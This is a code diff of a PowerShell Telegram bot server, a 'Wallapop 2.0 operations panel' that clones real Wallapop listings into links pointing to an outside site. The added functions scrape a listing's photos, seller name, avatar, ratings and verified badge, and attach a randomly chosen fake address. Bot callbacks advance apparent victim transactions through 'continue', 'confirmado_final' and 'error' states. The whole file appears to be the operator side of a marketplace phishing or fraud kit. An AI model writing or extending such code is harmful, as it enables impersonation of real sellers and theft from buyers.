@@ -2,6 +2,28 @@
 $Raiz = Split-Path -Parent $MyInvocation.MyCommand.Path
 Set-Location $Raiz
 
+# Cerrar instancias anteriores en el mismo puerto o procesos huérfanos
+try {
+  $conns = Get-NetTCPConnection -LocalPort $Puerto -State Listen -ErrorAction SilentlyContinue
+  if ($conns) {
+    foreach ($c in $conns) {
+      if ($c.OwningProcess -and $c.OwningProcess -ne $PID) {
+        Stop-Process -Id $c.OwningProcess -Force -ErrorAction SilentlyContinue
+      }
+    }
+    Start-Sleep -Milliseconds 300
+  }
+  $myParent = (Get-CimInstance Win32_Process -Filter "ProcessId = $PID").ParentProcessId
+  Get-CimInstance Win32_Process | Where-Object {
+    $_.ProcessId -ne $PID -and
+    $_.ProcessId -ne $myParent -and
+    $_.Name -match 'powershell' -and
+    $_.CommandLine -like '*server.ps1*'
+  } | ForEach-Object {
+    Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
+  }
+} catch { }
+
 $Cfg = Get-Content (Join-Path $Raiz 'config.json') -Raw | ConvertFrom-Json
 $Token = $Cfg.token
 $Puerto = if ($Cfg.port) { [int]$Cfg.port } else { 3000 }
@@ -21,59 +43,23 @@ function To-Hash($o) {
 $Db = @{}
 if (Test-Path $DbFile) {
   try {
-    $raw = Get-Content $DbFile -Raw -Encoding UTF8 | ConvertFrom-Json
-    $items = if ($raw.products) { $raw.products } else { $raw }
-    foreach ($prop in $items.PSObject.Properties) {
-      if ($prop.Name -ne 'products' -and $prop.Name -ne 'activeId' -and $prop.Value) {
-        $h = To-Hash $prop.Value
-        if ($h.ContainsKey('titulo') -or $h.ContainsKey('precio') -or $h.ContainsKey('id')) {
-          $h['id'] = $prop.Name
-          $Db[$prop.Name] = $h
-        }
-      }
-    }
+    $raw = Get-Content $DbFile -Raw | ConvertFrom-Json
+    $raw.PSObject.Properties | ForEach-Object { $Db[$_.Name] = To-Hash $_.Value }
   } catch { }
 }
 
 function Save-Db {
-  $cleanDb = @{}
-  foreach ($k in $Db.Keys) {
-    if ($k -ne 'products' -and $k -ne 'activeId' -and $Db[$k]) {
-      $cleanDb[$k] = $Db[$k]
-    }
-  }
-  $actId = if ($Script:Activo -and $Script:Activo -ne 'products' -and $Script:Activo -ne 'activeId') { [string]$Script:Activo } else { '' }
-  if (-not $actId -and $cleanDb.Keys.Count -gt 0) {
-    $actId = @($cleanDb.Keys)[0]
-    $Script:Activo = $actId
-  }
-
-  $jsonStr = $cleanDb | ConvertTo-Json -Depth 8
-  $jsonWrap = @{ products = $cleanDb; activeId = $actId } | ConvertTo-Json -Depth 8
+  $jsonStr = $Db | ConvertTo-Json -Depth 8
+  $jsonWrap = @{ products = $Db; activeId = $Script:Activo } | ConvertTo-Json -Depth 8
   $utf8NoBom = New-Object System.Text.UTF8Encoding($false)
   [System.IO.File]::WriteAllText($DbFile, $jsonStr, $utf8NoBom)
   [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.json'), $jsonWrap, $utf8NoBom)
   [System.IO.File]::WriteAllText((Join-Path $Raiz 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
-  if ($actId) {
-    [System.IO.File]::WriteAllText((Join-Path $DataDir 'activo.txt'), $actId, $utf8NoBom)
-  }
   $WebDir = Join-Path $Raiz 'web'
   if (Test-Path $WebDir) {
     try {
       [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.json'), $jsonWrap, $utf8NoBom)
       [System.IO.File]::WriteAllText((Join-Path $WebDir 'products.js'), ("window.SERVER_DB = " + $jsonWrap + ";"), $utf8NoBom)
-      $WebDataDir = Join-Path $WebDir 'data'
-      if (Test-Path $WebDataDir) {
-        [System.IO.File]::WriteAllText((Join-Path $WebDataDir 'productos.json'), $jsonStr, $utf8NoBom)
-        if ($actId) {
-          [System.IO.File]::WriteAllText((Join-Path $WebDataDir 'activo.txt'), $actId, $utf8NoBom)
-        }
-      }
-    } catch { }
-  }
-  if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
-    try {
-      Invoke-RestMethod -Uri ("{0}/api.php?action=sync_products" -f $Script:Base) -Method Post -Body $jsonWrap -ContentType "application/json; charset=utf-8" -TimeoutSec 5 | Out-Null
     } catch { }
   }
 }
@@ -130,7 +116,7 @@ function Responder($chat, $texto, $extra) {
 $Script:Ayuda = @'
 <b>🟢 Panel de operaciones Wallapop 2.0</b>
 
-/nuevo → crea un producto y te doy su enlace
+/nuevo → envíame el link de Wallapop y autorrelleno todo
 /productos → lista los enlaces
 /editar ID → deja un producto activo
 
@@ -143,7 +129,6 @@ $Script:Ayuda = @'
 /direccion texto
 /articulo texto
 /foto + imagen · /quitarfotos
-/url https://tu-sitio.com · cambiar dominio
 
 /borrar ID · /cancelar · /ayuda
 '@
@@ -158,37 +143,38 @@ function Url-Producto($p) {
       }
     }
   }
-
-  $cleanId = [string]$p['id']
-  $cleanBase = $Script:Base.TrimEnd('/')
-  if ($cleanBase -like '*localhost*' -or $cleanBase -like '*127.0.0.1*' -or -not $cleanBase) {
-    $cleanBase = 'https://wallaaaa.netlify.app'
+  # Si fotos no tiene URL pero tiene tg_fotos, resolver a weserv proxy URL usando el file_id
+  if ($fList.Count -eq 0 -and $p['tg_fotos']) {
+    foreach ($fid in @($p['tg_fotos'])) {
+      try {
+        $r = Send-Tg 'getFile' @{ file_id = $fid }
+        if ($r -and $r.ok -and $r.result.file_path) {
+          $fList += ("https://images.weserv.nl/?url=api.telegram.org/file/bot{0}/{1}" -f $Token, $r.result.file_path)
+        }
+      } catch { }
+    }
   }
-  $prodUrl = if ($cleanBase.EndsWith('/a')) { ("{0}/{1}" -f $cleanBase, $cleanId) } else { ("{0}/a/{1}" -f $cleanBase, $cleanId) }
 
   $minObj = @{
-    id = $cleanId
-    titulo = [string]$p['titulo']
-    precio = [double]$p['precio']
-    precioArticulo = if ($p['precioArticulo']) { [double]$p['precioArticulo'] } else { [double]$p['precio'] }
-    descripcion = if ($p['descripcion']) { [string]$p['descripcion'] } else { '' }
-    nombre = if ($p['nombre']) { [string]$p['nombre'] } else { 'Sofía Chamizo' }
-    direccion = if ($p['direccion']) { [string]$p['direccion'] } else { '' }
-    articulo = if ($p['articulo']) { [string]$p['articulo'] } else { [string]$p['titulo'] }
+    id = $p['id']
+    titulo = $p['titulo']
+    subtitulo = if ($p['subtitulo']) { $p['subtitulo'] } else { '' }
+    precio = $p['precio']
+    precioArticulo = if ($p['precioArticulo']) { $p['precioArticulo'] } else { $p['precio'] }
+    descripcion = if ($p['descripcion']) { $p['descripcion'] } else { '' }
+    nombre = if ($p['nombre']) { $p['nombre'] } else { 'Sofía Chamizo' }
+    avatar = if ($p['avatar']) { $p['avatar'] } else { '' }
+    rating_score = if ($p['rating_score']) { $p['rating_score'] } else { '4.9' }
+    rating_reviews = if ($p['rating_reviews']) { $p['rating_reviews'] } else { '81' }
+    verificado = if ($null -ne $p['verificado']) { $p['verificado'] } else { $true }
+    direccion = if ($p['direccion']) { $p['direccion'] } else { '' }
+    articulo = if ($p['articulo']) { $p['articulo'] } else { $p['titulo'] }
     fotos = $fList
   }
-
-  try {
-    $json = $minObj | ConvertTo-Json -Compress -Depth 4
-    $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
-    $b64 = [Convert]::ToBase64String($bytes)
-    $urlConP = ("{0}?p={1}" -f $prodUrl, [System.Uri]::EscapeDataString($b64))
-    if ($urlConP.Length -lt 2000) {
-      return $urlConP
-    }
-  } catch { }
-
-  return $prodUrl
+  $json = $minObj | ConvertTo-Json -Compress -Depth 4
+  $bytes = [System.Text.Encoding]::UTF8.GetBytes($json)
+  $b64 = [Convert]::ToBase64String($bytes)
+  return ($Script:Base + '/a/' + $p['id'] + '?p=' + [System.Uri]::EscapeDataString($b64))
 }
 
 function Resumen($p) {
@@ -210,21 +196,11 @@ function Notificar($chat, $p) {
   $fila = @(@{ text = '🍥 Abrir anuncio ❞'; url = $urlConDatos })
   $kb = @{ inline_keyboard = @(, $fila) }
 
-  # Intentar foto pública primero
-  $pubPhoto = $null
-  if ($p['fotos']) {
-    foreach ($f in @($p['fotos'])) {
-      if ($f -is [string] -and $f.StartsWith('http') -and $f -notlike '*api.telegram.org*') {
-        $pubPhoto = $f
-        break
-      }
-    }
-  }
-
-  $tgPhoto = if ($pubPhoto) {
-    $pubPhoto
-  } elseif ($p['tg_fotos'] -and @($p['tg_fotos']).Count -gt 0) {
+  # Usar file_id si está disponible, que Telegram acepta 100% nativo
+  $tgPhoto = if ($p['tg_fotos'] -and @($p['tg_fotos']).Count -gt 0) {
     @($p['tg_fotos'])[0]
+  } elseif ($p['fotos'] -and @($p['fotos']).Count -gt 0 -and (-not @($p['fotos'])[0].StartsWith('data:'))) {
+    @($p['fotos'])[0]
   } else { $null }
 
   if ($tgPhoto) {
@@ -237,70 +213,6 @@ function Notificar($chat, $p) {
   }
 }
 
-function Upload-Photo-Public($imgBytes, $fileName) {
-  # 1. Catbox.moe
-  try {
-    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $bodyStream = New-Object System.IO.MemoryStream
-    $h = "--$boundary$LF" +
-         "Content-Disposition: form-data; name=`"reqtype`"$LF$LF" +
-         "fileupload$LF" +
-         "--$boundary$LF" +
-         "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"$LF" +
-         "Content-Type: image/jpeg$LF$LF"
-    $hBytes = [System.Text.Encoding]::ASCII.GetBytes($h)
-    $bodyStream.Write($hBytes, 0, $hBytes.Length)
-    $bodyStream.Write($imgBytes, 0, $imgBytes.Length)
-    $f = "$LF--$boundary--$LF"
-    $fBytes = [System.Text.Encoding]::ASCII.GetBytes($f)
-    $bodyStream.Write($fBytes, 0, $fBytes.Length)
-
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-    $resBytes = $wc.UploadData("https://catbox.moe/user/api.php", $bodyStream.ToArray())
-    $resStr = [System.Text.Encoding]::UTF8.GetString($resBytes).Trim()
-    if ($resStr.StartsWith("https://files.catbox.moe/")) {
-      return $resStr
-    }
-  } catch { }
-
-  # 2. Litterbox fallback
-  try {
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $LF = "`r`n"
-    $bodyStream = New-Object System.IO.MemoryStream
-    $h = "--$boundary$LF" +
-         "Content-Disposition: form-data; name=`"reqtype`"$LF$LF" +
-         "fileupload$LF" +
-         "--$boundary$LF" +
-         "Content-Disposition: form-data; name=`"time`"$LF$LF" +
-         "72h$LF" +
-         "--$boundary$LF" +
-         "Content-Disposition: form-data; name=`"fileToUpload`"; filename=`"$fileName`"$LF" +
-         "Content-Type: image/jpeg$LF$LF"
-    $hBytes = [System.Text.Encoding]::ASCII.GetBytes($h)
-    $bodyStream.Write($hBytes, 0, $hBytes.Length)
-    $bodyStream.Write($imgBytes, 0, $imgBytes.Length)
-    $f = "$LF--$boundary--$LF"
-    $fBytes = [System.Text.Encoding]::ASCII.GetBytes($f)
-    $bodyStream.Write($fBytes, 0, $fBytes.Length)
-
-    $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
-    $wc.Headers.Add("Content-Type", "multipart/form-data; boundary=$boundary")
-    $resBytes = $wc.UploadData("https://litterbox.catbox.moe/resources/internals/api.php", $bodyStream.ToArray())
-    $resStr = [System.Text.Encoding]::UTF8.GetString($resBytes).Trim()
-    if ($resStr.StartsWith("http")) {
-      return $resStr
-    }
-  } catch { }
-
-  return $null
-}
-
 function Foto-Url($msg) {
   try {
     $lista = @($msg.photo)
@@ -310,27 +222,22 @@ function Foto-Url($msg) {
     $r = Send-Tg 'getFile' @{ file_id = $fid }
     if ($r -and $r.ok) {
       $filePath = $r.result.file_path
+      $proxyUrl = ("https://images.weserv.nl/?url=api.telegram.org/file/bot{0}/{1}" -f $Token, $filePath)
       $tgUrl = ("https://api.telegram.org/file/bot{0}/{1}" -f $Token, $filePath)
-      $fileName = ("img_" + (Get-Date -Format 'yyyyMMddHHmmssfff') + ".jpg")
       
-      $webClient = New-Object System.Net.WebClient
-      $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
-      $imgBytes = $webClient.DownloadData($tgUrl)
-      
-      # 1. Guardar copia local de respaldo
+      # Guardar copia local en web\photos por si se usa servidor local
       try {
         $photosDir = Join-Path $Raiz 'web\photos'
         if (!(Test-Path $photosDir)) { New-Item -ItemType Directory -Path $photosDir | Out-Null }
-        [System.IO.File]::WriteAllBytes((Join-Path $photosDir $fileName), $imgBytes)
+        $fileName = ("img_" + (Get-Date -Format 'yyyyMMddHHmmssfff') + ".jpg")
+        $webClient = New-Object System.Net.WebClient
+        $imgBytes = $webClient.DownloadData($tgUrl)
+        if ($imgBytes -and $imgBytes.Length -gt 0) {
+          [System.IO.File]::WriteAllBytes((Join-Path $photosDir $fileName), $imgBytes)
+        }
       } catch { }
 
-      # 2. Subir directamente a host público (Catbox / Litterbox)
-      $finalUrl = Upload-Photo-Public $imgBytes $fileName
-      if (-not $finalUrl) {
-        $finalUrl = "/photos/" + $fileName
-      }
-
-      return @{ url = $finalUrl; file_id = $fid; tg_url = $tgUrl; file_path = $filePath }
+      return @{ url = $proxyUrl; file_id = $fid; tg_url = $tgUrl; file_path = $filePath }
     }
   } catch { }
   return $null
@@ -366,6 +273,254 @@ if (Test-Path $ChatFile) { try { $Script:UltimoChat = (Get-Content $ChatFile -Ra
 
 $Script:TxEstados = @{}
 
+function Completar-Producto($chat) {
+  if (-not $Script:Wizard) {
+    if (Test-Path $WizFile) {
+      try {
+        $rawWiz = Get-Content $WizFile -Raw -Encoding UTF8 | ConvertFrom-Json
+        $Script:Wizard = To-Hash $rawWiz
+        if ($Script:Wizard -and $Script:Wizard['fotos']) {
+          $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
+        }
+      } catch { }
+    }
+  }
+  if (-not $Script:Wizard) { Responder $chat 'No hay ningún producto en creación. Usa /nuevo.'; return }
+  $p = $Script:Wizard
+  if (-not $p['nombre']) { $p['nombre'] = 'Sofía Chamizo' }
+  if (-not $p['direccion']) { $p['direccion'] = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024' }
+  if (-not $p['fotos']) { $p['fotos'] = @() } else { $p['fotos'] = @($p['fotos']) }
+  $Db[$p['id']] = $p
+  Set-Activo $p['id']
+  Save-Db
+  $Script:Wizard = $null
+  Save-Wizard
+  Notificar $chat $p
+}
+
+function Obtener-Direccion-Real {
+  $direcciones = @(
+    "Calle de Velázquez 42, 3º Dcha, 28001 Madrid",
+    "Carrer de Mallorca 234, 2º 1ª, 08008 Barcelona",
+    "Calle Sierpes 18, 1º B, 41004 Sevilla",
+    "Calle Colón 33, 4º C, 46004 Valencia",
+    "Paseo Prudencia Narváez 48, Piso 4, 17024 Cáceres",
+    "Calle Larios 12, 2º A, 29005 Málaga",
+    "Calle Alfonso I 29, 3º Izq, 50003 Zaragoza",
+    "Gran Vía 67, 5º Ext, 28013 Madrid",
+    "Rambla de Catalunya 85, Principal 2ª, 08008 Barcelona",
+    "Calle Marqués de Larios 5, 3º B, 29015 Málaga",
+    "Calle San Fernando 14, 2º A, 41004 Sevilla",
+    "Avenida de la Constitución 22, 1º Izq, 18012 Granada",
+    "Calle Uría 38, 4º D, 33003 Oviedo",
+    "Calle Príncipe 15, 2º C, 36202 Vigo, Pontevedra",
+    "Calle Poeta Querol 8, 3º B, 46002 Valencia",
+    "Paseo de Zorrilla 45, 6º A, 47007 Valladolid",
+    "Calle Recogidas 31, 3º Dcha, 18002 Granada",
+    "Avenida de la Libertad 19, 2º B, 20004 San Sebastián, Guipúzcoa",
+    "Calle Mayor 14, 2º Izq, 28013 Madrid",
+    "Calle San Vicente Mártir 54, 5º B, 46002 Valencia"
+  )
+  return ($direcciones | Get-Random)
+}
+
+function Scrape-Wallapop-Item($url) {
+  $headers = @{
+    'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    'Accept' = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+    'Accept-Language' = 'es-ES,es;q=0.9'
+  }
+  
+  $resp = Invoke-WebRequest -Uri $url -Headers $headers -TimeoutSec 15 -UseBasicParsing -MaximumRedirection 5
+  $html = $resp.Content
+
+  $prod = @{
+    titulo = ''
+    subtitulo = ''
+    precio = 0
+    precioArticulo = 0
+    descripcion = ''
+    nombre = ''
+    avatar = ''
+    rating_score = '4.9'
+    rating_reviews = '81'
+    verificado = $true
+    direccion = Obtener-Direccion-Real
+    fotos = @()
+  }
+
+  if ($html -match '(?s)<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>') {
+    try {
+      $data = $matches[1] | ConvertFrom-Json
+      $item = $data.props.pageProps.item
+      $seller = $data.props.pageProps.itemSeller
+
+      if ($item) {
+        if ($item.title -and $item.title.original) { $prod['titulo'] = [string]$item.title.original }
+        elseif ($item.title) { $prod['titulo'] = [string]$item.title }
+
+        if ($item.price -and $item.price.cash -and $item.price.cash.amount) {
+          $prod['precio'] = [double]$item.price.cash.amount
+        } elseif ($item.price -and $item.price.amount) {
+          $prod['precio'] = [double]$item.price.amount
+        }
+
+        if ($item.description -and $item.description.original) {
+          $prod['descripcion'] = [string]$item.description.original
+        } elseif ($item.description) {
+          $prod['descripcion'] = [string]$item.description
+        }
+
+        if ($item.images) {
+          $fList = @()
+          foreach ($im in $item.images) {
+            $u = ''
+            if ($im.urls -and $im.urls.big) { $u = $im.urls.big }
+            elseif ($im.original) { $u = $im.original }
+            elseif ($im -is [string]) { $u = $im }
+            if ($u) {
+              if ($u -match 'pictureSize=') { $u = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800' }
+              $fList += $u
+            }
+          }
+          if ($fList.Count -gt 0) { $prod['fotos'] = $fList }
+        }
+
+        $subParts = @()
+        if ($item.condition -and $item.condition.text) { $subParts += $item.condition.text }
+        if ($item.brand) { $subParts += $item.brand }
+        if ($item.model) { $subParts += $item.model }
+        if ($item.characteristicsDetails) {
+          foreach ($c in $item.characteristicsDetails) {
+            if ($c.value -and $subParts -notcontains $c.value) { $subParts += $c.value }
+          }
+        }
+        if ($subParts.Count -gt 0) {
+          $prod['subtitulo'] = ($subParts -join ' · ')
+        }
+      }
+
+      if ($seller) {
+        if ($seller.microName) { $prod['nombre'] = [string]$seller.microName }
+        if ($seller.avatarImage) { $prod['avatar'] = [string]$seller.avatarImage }
+        if ($null -ne $seller.verified) { $prod['verificado'] = [bool]$seller.verified }
+        if ($seller.stats) {
+          if ($seller.stats.ratingAverage) { $prod['rating_score'] = [string]$seller.stats.ratingAverage }
+          if ($seller.stats.counters -and $seller.stats.counters.reviews) {
+            $prod['rating_reviews'] = [string]$seller.stats.counters.reviews
+          } elseif ($seller.stats.ratings -and $seller.stats.ratings.reviews) {
+            $prod['rating_reviews'] = [string]$seller.stats.ratings.reviews
+          }
+        }
+      }
+    } catch { }
+  }
+
+  if (-not $prod['titulo']) {
+    if ($html -match '(?s)<h1[^>]*class="[^"]*chds-mid-l[^"]*"[^>]*>(.*?)</h1>') {
+      $prod['titulo'] = ($matches[1] -replace '<[^>]+>', '').Trim()
+    } elseif ($html -match '(?s)<h1[^>]*>(.*?)</h1>') {
+      $prod['titulo'] = ($matches[1] -replace '<[^>]+>', '').Trim()
+    } elseif ($html -match 'property="og:title"\s*content="([^"]+)"') {
+      $prod['titulo'] = $matches[1].Trim()
+    }
+  }
+
+  if ($prod['precio'] -eq 0) {
+    if ($html -match '"price":\s*"?([0-9\.,]+)"?') {
+      $prod['precio'] = [double]($matches[1].Replace(',', '.'))
+    } elseif ($html -match 'property="product:price:amount"\s*content="([^"]+)"') {
+      $prod['precio'] = [double]($matches[1].Replace(',', '.'))
+    } elseif ($html -match '(?s)<span[^>]*class="[^"]*chds-headline[^"]*"[^>]*>([0-9\.,]+)\s*€?</span>') {
+      $prod['precio'] = [double]($matches[1].Replace('.', '').Replace(',', '.'))
+    }
+  }
+
+  if (-not $prod['descripcion']) {
+    if ($html -match '(?s)<div[^>]*class="[^"]*_2YE-bW_ProductDescription[^"]*"[^>]*>(.*?)</div>') {
+      $prod['descripcion'] = ($matches[1] -replace '<[^>]+>', '').Trim()
+    } elseif ($html -match 'property="og:description"\s*content="([^"]+)"') {
+      $prod['descripcion'] = $matches[1].Trim()
+    }
+  }
+
+  if (@($prod['fotos']).Count -eq 0) {
+    $imgMatches = [regex]::Matches($html, 'slot="carousel-content"[^>]*src="([^"]+)"')
+    $fList = @()
+    foreach ($m in $imgMatches) {
+      $u = $m.Groups[1].Value
+      if ($u -match 'pictureSize=') { $u = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800' }
+      $fList += $u
+    }
+    if ($fList.Count -eq 0) {
+      $allCdn = [regex]::Matches($html, 'https://cdn\.wallapop\.com/images/[^"\s]+')
+      $seen = @{}
+      foreach ($m in $allCdn) {
+        $u = $m.Value
+        if ($u -like '*pictureSize=*' -and $u -notlike '*profile*' -and $u -notlike '*avatar*') {
+          $clean = $u -replace 'pictureSize=[^&"]+', 'pictureSize=W800'
+          if (-not $seen.ContainsKey($clean)) {
+            $seen[$clean] = $true
+            $fList += $clean
+          }
+        }
+      }
+    }
+    $prod['fotos'] = $fList
+  }
+
+  if (-not $prod['nombre']) {
+    if ($html -match '(?s)<span[^>]*class="[^"]*chds-mid-m chds-content-high text-truncate[^"]*"[^>]*>(.*?)</span>') {
+      $prod['nombre'] = ($matches[1] -replace '<[^>]+>', '').Trim()
+    } else {
+      $prod['nombre'] = 'Sofía Chamizo'
+    }
+  }
+
+  if (-not $prod['avatar']) {
+    if ($html -match '(?s)<img[^>]*class="[^"]*walla-avatar__avatar[^"]*"[^>]*src="([^"]+)"') {
+      $prod['avatar'] = $matches[1].Trim()
+    } elseif ($html -match '(?s)<walla-avatar[^>]*src="([^"]+)"') {
+      $prod['avatar'] = $matches[1].Trim()
+    }
+  }
+
+  if ($html -match 'Perfil verificado') {
+    $prod['verificado'] = $true
+  }
+
+  if ($html -match 'score="([^"]+)"\s*reviews="([^"]+)"') {
+    $prod['rating_score'] = $matches[1]
+    $prod['rating_reviews'] = $matches[2]
+  }
+
+  $prod['precioArticulo'] = $prod['precio']
+  $prod['articulo'] = $prod['titulo']
+
+  return $prod
+}
+
+function Crear-Desde-Wallapop($chat, $url) {
+  Responder $chat '⏳ <b>Extrayendo datos de Wallapop...</b>'
+  try {
+    $p = Scrape-Wallapop-Item $url
+    if (-not $p -or -not $p['titulo']) {
+      Responder $chat '⚠️ No pude leer los datos del anuncio. Comprueba que el enlace sea correcto y público.'
+      return
+    }
+    $newId = Nuevo-Id
+    $p['id'] = $newId
+    $Db[$newId] = $p
+    Set-Activo $newId
+    Save-Db
+    $Script:Wizard = $null
+    Save-Wizard
+    Notificar $chat $p
+  } catch {
+    Responder $chat ('⚠️ Error al cargar el enlace: ' + (Esc $_.Exception.Message))
+  }
+}
+
 function Handle-Update($u) {
   if ($u.callback_query) {
     $cq = $u.callback_query
@@ -381,13 +536,6 @@ function Handle-Update($u) {
       if (-not $target) { $target = $Script:Activo }
       $Script:TxEstados[$target] = 'continue'
       if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'continue' }
-
-      # Notificar al hosting inmediatamente
-      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
-        try {
-          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=continue" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
-        } catch { }
-      }
 
       # Publicar estado en Telegram bot description para que la web (Netlify o local) lo lea al instante
       Send-Tg 'setMyDescription' @{ description = ("status:continue:" + $target) } | Out-Null
@@ -405,13 +553,6 @@ function Handle-Update($u) {
       $Script:TxEstados[$target] = 'confirmado_final'
       if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'confirmado_final' }
 
-      # Notificar al hosting inmediatamente
-      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
-        try {
-          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=confirmado_final" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
-        } catch { }
-      }
-
       # Publicar estado en Telegram bot description
       Send-Tg 'setMyDescription' @{ description = ("status:confirmado_final:" + $target) } | Out-Null
 
@@ -427,13 +568,6 @@ function Handle-Update($u) {
       if (-not $target) { $target = $Script:Activo }
       $Script:TxEstados[$target] = 'error'
       if ($Script:Activo) { $Script:TxEstados[$Script:Activo] = 'error' }
-
-      # Notificar al hosting inmediatamente
-      if ($Script:Base -and $Script:Base -notlike '*localhost*' -and $Script:Base -notlike '*127.0.0.1*') {
-        try {
-          Invoke-RestMethod -Uri ("{0}/api.php?action=set_status&id={1}&status=error" -f $Script:Base, $target) -Method Get -TimeoutSec 5 | Out-Null
-        } catch { }
-      }
 
       # Publicar estado en Telegram bot description
       Send-Tg 'setMyDescription' @{ description = ("status:error:" + $target) } | Out-Null
@@ -471,12 +605,7 @@ function Handle-Update($u) {
           $Script:Wizard['tg_fotos'] = @($Script:Wizard['tg_fotos']) + $fotoData.file_id
         }
         Save-Wizard
-        $msgFotoTxt = "🖼 <b>Foto " + @($Script:Wizard['fotos']).Count + " recibida y subida correctamente</b>`n"
-        if ($fotoData.url.StartsWith("http")) {
-          $msgFotoTxt += "🔗 Enlace directo generado:`n<code>" + $fotoData.url + "</code>`n`n"
-        }
-        $msgFotoTxt += "Manda más fotos o escribe /listo para terminar."
-        Responder $chat $msgFotoTxt
+        Responder $chat ('🖼 ' + @($Script:Wizard['fotos']).Count + ' foto(s). Manda más o escribe /listo.')
       } else { Responder $chat '⚠️ No pude descargar la imagen, prueba otra vez.' }
       return
     }
@@ -490,12 +619,7 @@ function Handle-Update($u) {
           $Db[$Script:Activo]['tg_fotos'] = @($Db[$Script:Activo]['tg_fotos']) + $fotoData.file_id
         }
         Save-Db
-        $msgFotoTxt = "✅ <b>Foto subida y añadida al producto activo</b> (" + @($Db[$Script:Activo]['fotos']).Count + ")`n"
-        if ($fotoData.url.StartsWith("http")) {
-          $msgFotoTxt += "🔗 <code>" + $fotoData.url + "</code>`n`n"
-        }
-        $msgFotoTxt += (Url-Producto $Db[$Script:Activo])
-        Responder $chat $msgFotoTxt
+        Responder $chat ('✅ Foto añadida (' + @($Db[$Script:Activo]['fotos']).Count + ').' + "`n" + (Url-Producto $Db[$Script:Activo]))
       } else { Responder $chat '⚠️ No pude descargar la imagen.' }
       return
     }
@@ -504,6 +628,16 @@ function Handle-Update($u) {
   }
 
   if ($Script:Wizard -and $texto -and -not $texto.StartsWith('/')) {
+    if ($Script:Wizard['step'] -eq 'wallapop_url') {
+      if ($texto -match 'https?://[^\s]+') {
+        Crear-Desde-Wallapop $chat $matches[0]
+        return
+      } else {
+        Responder $chat '⚠️ Por favor, envía un enlace válido de Wallapop (ejemplo: https://es.wallapop.com/item/...):'
+        return
+      }
+    }
+
     switch ($Script:Wizard['step']) {
       'titulo' {
         $Script:Wizard['titulo'] = $texto
@@ -544,10 +678,23 @@ function Handle-Update($u) {
         Responder $chat '📷 Envía las fotos que quieras y escribe /listo para terminar.'
         return
       }
+      'fotos' {
+        if ($texto.ToLower() -eq 'listo' -or $texto.ToLower() -eq '/listo') {
+          Completar-Producto $chat
+          return
+        }
+        Responder $chat '📷 Envía las fotos del producto o escribe /listo para terminar la creación.'
+        return
+      }
+      default {
+        return
+      }
     }
+    return
   }
 
   if (-not $texto.StartsWith('/')) {
+    if ($texto.ToLower() -eq 'ayuda') { Responder $chat $Script:Ayuda; return }
     Responder $chat 'Usa /nuevo para crear un producto o /ayuda para ver los comandos.'
     return
   }
@@ -563,84 +710,45 @@ function Handle-Update($u) {
     '/ayuda' { Responder $chat $Script:Ayuda; return }
 
     '/nuevo' {
+      if ($arg -and $arg -match 'https?://[^\s]+') {
+        Crear-Desde-Wallapop $chat $matches[0]
+        return
+      }
       $Script:Wizard = @{
-        step = 'titulo'; id = (Nuevo-Id); fotos = @(); tg_fotos = @()
-        nombre = ''; direccion = ''
-        descripcion = ''; titulo = ''; articulo = ''; precio = 0; precioArticulo = 0
+        step = 'wallapop_url'
+        id = (Nuevo-Id)
       }
       Save-Wizard
-      Responder $chat '1/5 · ¿Título del producto?'
+      Responder $chat "📎 <b>Crear producto desde Wallapop</b>`n`nPásame el enlace del producto de Wallapop que quieras clonar:"
       return
     }
 
     '/cancelar' { $Script:Wizard = $null; Save-Wizard; Responder $chat 'Creación cancelada.'; return }
 
-    '/listo' {
-      if (-not $Script:Wizard) {
-        if (Test-Path $WizFile) {
-          try {
-            $rawWiz = Get-Content $WizFile -Raw -Encoding UTF8 | ConvertFrom-Json
-            $Script:Wizard = To-Hash $rawWiz
-            if ($Script:Wizard -and $Script:Wizard['fotos']) {
-              $Script:Wizard['fotos'] = @($Script:Wizard['fotos'])
-            }
-          } catch { }
-        }
-      }
-      if (-not $Script:Wizard) { Responder $chat 'No hay ningún producto en creación. Usa /nuevo.'; return }
-      $p = $Script:Wizard
-      if (-not $p['nombre']) { $p['nombre'] = 'Sofía Chamizo' }
-      if (-not $p['direccion']) { $p['direccion'] = 'Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024' }
-      if (-not $p['fotos']) { $p['fotos'] = @() } else { $p['fotos'] = @($p['fotos']) }
